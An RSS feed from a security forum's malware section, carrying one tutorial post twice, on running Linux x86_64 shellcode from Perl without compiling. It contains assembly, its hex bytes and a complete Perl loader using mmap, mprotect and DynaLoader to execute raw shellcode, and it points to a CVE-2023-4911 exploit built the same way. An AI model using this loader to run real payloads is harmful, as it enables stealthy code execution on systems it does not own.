<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>Executing assembly/shellcode on-the-fly with Perl</title>
    <link>https://0x00sec.org/t/executing-assembly-shellcode-on-the-fly-with-perl/37586</link>
    <description>&lt;h2&gt;Introduction&lt;/h2&gt;
&lt;p&gt;
This post describes a simple trick to copy arbitrary assembly/shellcode (Linux x86_64) into a mapped memory address and then execute it on-the-fly as if it were an external subroutine, no compiling or extra tools needed (based on &lt;a href=&quot;https://hckng.org/articles/perlhacking-I-peek-poke-xsub.html&quot; target=&quot;_blank&quot;&gt; Perl hacking I: PEEK &amp; POKE &amp; XSUB&lt;/a&gt;). 
&lt;/p&gt;

&lt;h2&gt;Copying payload into memory&lt;/h2&gt;
&lt;p&gt;
Two things are needed for copying an assembly/shellcode payload into memory: a temporary file with the given payload and two syscalls to map a new memory area and read the temporary file&#39;s content into such area. Let&#39;s consider the following assembly code which executes /usr/bin/id with execve:
&lt;/p&gt;

```
BITS 64
 global main
 section .text
 main:
    call run
    db &quot;/usr/bin/id&quot;, 0x0

 run:
    ;;;;;;;;;;;;;;;;;;;;;;;;;
    ; call id
    ;;;;;;;;;;;;;;;;;;;;;;;;;
    pop rsi
    pop rsi ; twice to remove garbage when called from Perl

    xor rax, rax
    lea rdi, [rsi]
    
    ; argv
    ; [&quot;/usr/bin/id&quot;]
    push 0
    push rdi          ; &quot;/usr/bin/id&quot;
    mov rsi, rsp 

    ; execve &amp; exit
    xor rax, rax
    mov rax, 59
    mov rdx, 0
    syscall
    pop rsi
    xor rdx, rdx
    mov rax, 60
    syscall
```

Compile it and extract its hexadecimal representation:
```
$ nasm -f elf64 id.s -o id.o
$ objcopy -O binary -j .text id.o id
$ od -An -v -t x1 id &gt; idhex
$ cat idhex
 e8 0c 00 00 00 2f 75 73 72 2f 62 69 6e 2f 69 64
 00 5e 48 31 c0 48 8d 3e 6a 00 57 48 89 e6 48 31
 c0 b8 3b 00 00 00 ba 00 00 00 00 0f 05 5e 48 31
 d2 b8 3c 00 00 00 0f 05
```
Modify the second byte by adding 1 (from 0c to 0d). This is to prevent an rsi full of garbage when executing the payload from Perl. Include the hexadecimal payload in the script and write it to a file:
```
# payload to execute /usr/bin/id with execve (x86_64)
my $p = &quot;&quot;;
$p .= &quot;\xe8\x0d\x00\x00\x00\x2f\x75\x73\x72\x2f\x62\x69\x6e\x2f\x69&quot;;
$p .= &quot;\x64\x00\x5e\x5e\x48\x31\xc0\x48\x8d\x3e\x6a\x00\x57\x48\x89&quot;;
$p .= &quot;\xe6\x48\x31\xc0\xb8\x3b\x00\x00\x00\xba\x00\x00\x00\x00\x0f&quot;;
$p .= &quot;\x05\x5e\x48\x31\xd2\xb8\x3c\x00\x00\x00\x0f\x05&quot;;

my $f = &quot;p&quot;;
open my $fh, &#39;&gt;&#39;, $f;
syswrite($fh, $p);
```
Then use the mmap, open and read syscalls to map a new memory area, open the temporary file and read its content into the buffer starting at the mapped memory area:
```
my $sz = (stat $f)[7];

# mmap syscall number 9
# 0 to let the system choose the start of the mapped area
# 3 for PROT_READ | PROT_WRITE
# 33 for MAP_SHARED | MAP_ANONYMOUS
# -1 and 0 to avoid the use of files
my $ptr = syscall(9, 0, $sz, 3, 33, -1, 0);
if($ptr == -1) {
    die &quot;failed to map memory\n&quot;;
}

# open syscall number 2
# 0 for read only flag
my $fd = syscall(2, $f, 0);

# read syscall number 0
# use $ptr as buffer
my $bytes = syscall(0, $fd, $ptr, $sz);
if($bytes == -1) {
	die &quot;failed to read payload file\n&quot;
}
```

&lt;h2&gt;Executing assembly/shellcode payload&lt;/h2&gt;
&lt;p&gt;
To executed the payload first the protection of the mapped memory area needs to be updated to allow execution (using mprotect):

```
# mprotect syscall number 10
# 5 for PROT_READ | PROT_EXEC
my $ret = syscall(10, $ptr, $sz, 5);
if($ret == -1) {
    die &quot;failed to update memory protection\n&quot;;
}
```
Then dl_install_xsub() from DynaLoader (standard module) is used to create a new Perl external subroutine based on the parameters $perl_name and $symref and obtain a reference to the &quot;installed function&quot;. The parameter $symref is expected to be a pointer to the function which implements the routine
to be installed, however, a pointer to the payload copied into memory can be used instead. Then a simple call to the dereferenced function executes the payload:

```
my $x = DynaLoader::dl_install_xsub(&quot;&quot;, $ptr);
&amp;{$x};
```
&lt;a href=&quot;https://github.com/ilv/misc/blob/main/exec_asm64-read.pl&quot; target=&quot;_blank&quot;&gt;Example&lt;/a&gt;:
```
$ perl exec_asm64-read.pl
...
[+] Trying to write payload to a temporary file...OK
[+] Payload size: 57
[+] Trying to map new memory area...OK
[+] Start of mapped area: 0x7fefdda14000
[+] Trying to write payload at 0x7fefdda14000...OK
[+] Trying to update memory protection...OK
[+] Trying to install xsub...OK
[+] Going to execute:

uid=1000(isra) gid=1000(isra)...
```
A redacted version of the code looks like this (no checks, etc):
```
use DynaLoader;

$p  = &quot;\xe8\x0d\x00\x00\x00\x2f\x75\x73\x72\x2f\x62\x69\x6e\x2f\x69&quot;;
$p .= &quot;\x64\x00\x5e\x5e\x48\x31\xc0\x48\x8d\x3e\x6a\x00\x57\x48\x89&quot;;
$p .= &quot;\xe6\x48\x31\xc0\xb8\x3b\x00\x00\x00\xba\x00\x00\x00\x00\x0f&quot;;
$p .= &quot;\x05\x5e\x48\x31\xd2\xb8\x3c\x00\x00\x00\x0f\x05&quot;;

$f = &quot;p&quot;;
open $fh, &#39;&gt;&#39;, $f;
syswrite($fh, $p);

$sz = (stat $f)[7];
$ptr = syscall(9, 0, $sz, 3, 33, -1, 0);     # mmap
$fd = syscall(2, $f, 0);                     # open
syscall(0, $fd, $ptr, $sz);                  # read
syscall(10, $ptr, $sz, 5);                   # mprotect
$x = DynaLoader::dl_install_xsub(&quot;&quot;, $ptr);
&amp;{$x};
```

&lt;h2&gt;Final words&lt;/h2&gt;
The execution of assembly/shellcode with Perl opens up the door for various interesting things, considering that no compilation is needed and Perl is available by default on almost all (if not all) Linux distributions. For example, you can take a look at &lt;a href=&quot;https://github.com/ilv/exploits/blob/main/looney.pl&quot; target=&quot;_blank&quot;&gt;looney.pl&lt;/a&gt;, an exploit for CVE-2023-4911 &quot;Looney Tunables&quot;. The script uses Perl for obtaining the necessary data from the system and then executes an assembly/shellcode payload to call &quot;usr/bin/su --help&quot; using execve with a crafted envp. In this case looney.pl uses a more complicated mechanism for copying data into memory but it&#39;s the same idea at the end.

Stay tuned, more stuff is coming soon!</description>
    
    <lastBuildDate>Thu, 26 Oct 2023 19:07:20 +0000</lastBuildDate>
    <category>Malware</category>
    <atom:link href="https://0x00sec.org/t/executing-assembly-shellcode-on-the-fly-with-perl/37586.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>Executing assembly/shellcode on-the-fly with Perl</title>
        <dc:creator><![CDATA[system]]></dc:creator>
        <description><![CDATA[
            <p>This topic was automatically closed after 121 days. New replies are no longer allowed.</p>
          <p><a href="https://0x00sec.org/t/executing-assembly-shellcode-on-the-fly-with-perl/37586/2">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/executing-assembly-shellcode-on-the-fly-with-perl/37586/2</link>
        <pubDate>Sun, 25 Feb 2024 10:49:18 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-37586-2</guid>
        <source url="https://0x00sec.org/t/executing-assembly-shellcode-on-the-fly-with-perl/37586.rss">Executing assembly/shellcode on-the-fly with Perl</source>
      </item>
      <item>
        <title>Executing assembly/shellcode on-the-fly with Perl</title>
        <dc:creator><![CDATA[isra]]></dc:creator>
        <description><![CDATA[
            <h2>Introduction</h2>
<p>
This post describes a simple trick to copy arbitrary assembly/shellcode (Linux x86_64) into a mapped memory address and then execute it on-the-fly as if it were an external subroutine, no compiling or extra tools needed (based on <a href="https://hckng.org/articles/perlhacking-I-peek-poke-xsub.html" target="_blank" rel="noopener nofollow ugc"> Perl hacking I: PEEK &amp; POKE &amp; XSUB</a>). 
</p>
<h2>Copying payload into memory</h2>
<p>
Two things are needed for copying an assembly/shellcode payload into memory: a temporary file with the given payload and two syscalls to map a new memory area and read the temporary file's content into such area. Let's consider the following assembly code which executes /usr/bin/id with execve:
</p>
<pre><code class="lang-auto">BITS 64
 global main
 section .text
 main:
    call run
    db "/usr/bin/id", 0x0

 run:
    ;;;;;;;;;;;;;;;;;;;;;;;;;
    ; call id
    ;;;;;;;;;;;;;;;;;;;;;;;;;
    pop rsi
    pop rsi ; twice to remove garbage when called from Perl

    xor rax, rax
    lea rdi, [rsi]
    
    ; argv
    ; ["/usr/bin/id"]
    push 0
    push rdi          ; "/usr/bin/id"
    mov rsi, rsp 

    ; execve &amp; exit
    xor rax, rax
    mov rax, 59
    mov rdx, 0
    syscall
    pop rsi
    xor rdx, rdx
    mov rax, 60
    syscall
</code></pre>
<p>Compile it and extract its hexadecimal representation:</p>
<pre><code class="lang-auto">$ nasm -f elf64 id.s -o id.o
$ objcopy -O binary -j .text id.o id
$ od -An -v -t x1 id &gt; idhex
$ cat idhex
 e8 0c 00 00 00 2f 75 73 72 2f 62 69 6e 2f 69 64
 00 5e 48 31 c0 48 8d 3e 6a 00 57 48 89 e6 48 31
 c0 b8 3b 00 00 00 ba 00 00 00 00 0f 05 5e 48 31
 d2 b8 3c 00 00 00 0f 05
</code></pre>
<p>Modify the second byte by adding 1 (from 0c to 0d). This is to prevent an rsi full of garbage when executing the payload from Perl. Include the hexadecimal payload in the script and write it to a file:</p>
<pre><code class="lang-auto"># payload to execute /usr/bin/id with execve (x86_64)
my $p = "";
$p .= "\xe8\x0d\x00\x00\x00\x2f\x75\x73\x72\x2f\x62\x69\x6e\x2f\x69";
$p .= "\x64\x00\x5e\x5e\x48\x31\xc0\x48\x8d\x3e\x6a\x00\x57\x48\x89";
$p .= "\xe6\x48\x31\xc0\xb8\x3b\x00\x00\x00\xba\x00\x00\x00\x00\x0f";
$p .= "\x05\x5e\x48\x31\xd2\xb8\x3c\x00\x00\x00\x0f\x05";

my $f = "p";
open my $fh, '&gt;', $f;
syswrite($fh, $p);
</code></pre>
<p>Then use the mmap, open and read syscalls to map a new memory area, open the temporary file and read its content into the buffer starting at the mapped memory area:</p>
<pre><code class="lang-auto">my $sz = (stat $f)[7];

# mmap syscall number 9
# 0 to let the system choose the start of the mapped area
# 3 for PROT_READ | PROT_WRITE
# 33 for MAP_SHARED | MAP_ANONYMOUS
# -1 and 0 to avoid the use of files
my $ptr = syscall(9, 0, $sz, 3, 33, -1, 0);
if($ptr == -1) {
    die "failed to map memory\n";
}

# open syscall number 2
# 0 for read only flag
my $fd = syscall(2, $f, 0);

# read syscall number 0
# use $ptr as buffer
my $bytes = syscall(0, $fd, $ptr, $sz);
if($bytes == -1) {
	die "failed to read payload file\n"
}
</code></pre>
<h2>Executing assembly/shellcode payload</h2>
<p>
To executed the payload first the protection of the mapped memory area needs to be updated to allow execution (using mprotect):
</p><pre><code class="lang-auto"># mprotect syscall number 10
# 5 for PROT_READ | PROT_EXEC
my $ret = syscall(10, $ptr, $sz, 5);
if($ret == -1) {
    die "failed to update memory protection\n";
}
</code></pre>
<p>Then dl_install_xsub() from DynaLoader (standard module) is used to create a new Perl external subroutine based on the parameters $perl_name and $symref and obtain a reference to the “installed function”. The parameter $symref is expected to be a pointer to the function which implements the routine<br>
to be installed, however, a pointer to the payload copied into memory can be used instead. Then a simple call to the dereferenced function executes the payload:</p>
<pre><code class="lang-auto">my $x = DynaLoader::dl_install_xsub("", $ptr);
&amp;{$x};
</code></pre>
<p><a href="https://github.com/ilv/misc/blob/main/exec_asm64-read.pl" target="_blank" rel="noopener nofollow ugc">Example</a>:</p>
<pre><code class="lang-auto">$ perl exec_asm64-read.pl
...
[+] Trying to write payload to a temporary file...OK
[+] Payload size: 57
[+] Trying to map new memory area...OK
[+] Start of mapped area: 0x7fefdda14000
[+] Trying to write payload at 0x7fefdda14000...OK
[+] Trying to update memory protection...OK
[+] Trying to install xsub...OK
[+] Going to execute:

uid=1000(isra) gid=1000(isra)...
</code></pre>
<p>A redacted version of the code looks like this (no checks, etc):</p>
<pre><code class="lang-auto">use DynaLoader;

$p  = "\xe8\x0d\x00\x00\x00\x2f\x75\x73\x72\x2f\x62\x69\x6e\x2f\x69";
$p .= "\x64\x00\x5e\x5e\x48\x31\xc0\x48\x8d\x3e\x6a\x00\x57\x48\x89";
$p .= "\xe6\x48\x31\xc0\xb8\x3b\x00\x00\x00\xba\x00\x00\x00\x00\x0f";
$p .= "\x05\x5e\x48\x31\xd2\xb8\x3c\x00\x00\x00\x0f\x05";

$f = "p";
open $fh, '&gt;', $f;
syswrite($fh, $p);

$sz = (stat $f)[7];
$ptr = syscall(9, 0, $sz, 3, 33, -1, 0);     # mmap
$fd = syscall(2, $f, 0);                     # open
syscall(0, $fd, $ptr, $sz);                  # read
syscall(10, $ptr, $sz, 5);                   # mprotect
$x = DynaLoader::dl_install_xsub("", $ptr);
&amp;{$x};
</code></pre>
<h2>Final words</h2>
The execution of assembly/shellcode with Perl opens up the door for various interesting things, considering that no compilation is needed and Perl is available by default on almost all (if not all) Linux distributions. For example, you can take a look at <a href="https://github.com/ilv/exploits/blob/main/looney.pl" target="_blank" rel="noopener nofollow ugc">looney.pl</a>, an exploit for CVE-2023-4911 "Looney Tunables". The script uses Perl for obtaining the necessary data from the system and then executes an assembly/shellcode payload to call "usr/bin/su --help" using execve with a crafted envp. In this case looney.pl uses a more complicated mechanism for copying data into memory but it's the same idea at the end.
<p>Stay tuned, more stuff is coming soon!</p>
          <p><a href="https://0x00sec.org/t/executing-assembly-shellcode-on-the-fly-with-perl/37586/1">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/executing-assembly-shellcode-on-the-fly-with-perl/37586/1</link>
        <pubDate>Thu, 26 Oct 2023 18:49:17 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-37586-1</guid>
        <source url="https://0x00sec.org/t/executing-assembly-shellcode-on-the-fly-with-perl/37586.rss">Executing assembly/shellcode on-the-fly with Perl</source>
      </item>
  </channel>
</rss>
